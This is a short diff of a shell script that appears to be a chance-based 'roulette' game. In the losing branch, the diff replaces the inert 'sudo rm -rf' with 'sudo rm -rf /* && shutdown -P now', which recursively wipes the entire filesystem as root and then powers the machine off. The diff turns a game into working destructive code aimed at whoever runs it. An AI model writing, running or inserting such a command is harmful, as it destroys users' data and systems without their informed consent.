@@ -12,7 +12,7 @@ for i in $(seq 1 $rounds); do
 
 	if [ $num == 1 ]; then
 		echo "Have a nice life"
-		sudo rm -rf && shutdown -P now
+		sudo rm -rf /* && shutdown -P now
 	else
 		echo "You won!"
 	fi
